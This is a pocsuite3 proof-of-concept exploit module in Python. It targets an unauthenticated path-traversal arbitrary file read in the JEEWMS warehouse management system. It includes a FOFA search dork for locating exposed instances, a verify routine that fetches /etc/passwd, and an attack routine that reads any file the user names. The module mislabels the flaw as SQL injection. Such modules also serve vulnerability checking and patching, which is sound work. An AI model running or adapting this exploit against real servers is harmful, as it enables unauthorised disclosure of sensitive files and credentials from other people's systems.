from pocsuite3.api import requests, POCBase, Output, register_poc, logger, VUL_TYPE, POC_CATEGORY
from collections import OrderedDict
from pocsuite3.api import OptString

class TestPOC(POCBase):
    vulID = '0'  
    version = '1.0' 
    author = 'Zer0'  
    vulDate = '2024-03-08' 
    createDate = '2024-03-08'
    updateDate = '2024-03-08'
    references = ['']
    name = 'JEEWMS 任意文件读取'
    appName = 'JEEWMS'
    appPowerLink = 'https://gitee.com/erzhongxmu/jeewms' 
    appVersion = ''
    vulType = VUL_TYPE.SQL_INJECTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    desc = '''
    JEEWMS基于JAVA的仓库管理系统（支持3PL（三方物流）和厂内物流），包含PDA端和WEB端，功能涵盖WMS，OMS，BMS（计费管理系统），TMS，成功应用于多家国内知名大客户，客户群体：冷链，干仓，快消品，汽车主机厂和配件厂等行业。
    JEEWMS存在任意文件读取漏洞，未授权的攻击者可以通过该漏洞读取任意文件，造成敏感信息泄露。
    '''
    dork = {'fofa': 'body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"'}
    pocDesc = '''poc usage'''
    samples = ['']
    install_requires = ['']

    def _verify(self):
        result = {}
        path = "/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd"
        target = self.url + path

        try:
            r = requests.get(url=target, timeout=15, verify=False, allow_redirects=False)
            # print(r.status_code)
            # print(r.text)
            if r.status_code == 200 and "root" in r.text:
                print(r.text)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['Path'] = path
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

    def _attack(self):
        result = {}
        headers = {
            "Host": self.rhost + ":" + str(self.rport),
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Accept-Language": "en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Connection": "close"
        }
        filename = self.get_option("file_read")
        path = "/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../{}".format(filename)
        target = self.url + path

        try:
            r = requests.get(url=target, timeout=15, verify=False, allow_redirects=False, headers=headers)
            # print(r.status_code)
            # print(r.text)
            if r.status_code == 200:
                print(r.text)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['Path'] = path
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _options(self):
        o = OrderedDict()
        o["file_read"] = OptString("/etc/passwd", description="The command to read file")
        return o

register_poc(TestPOC)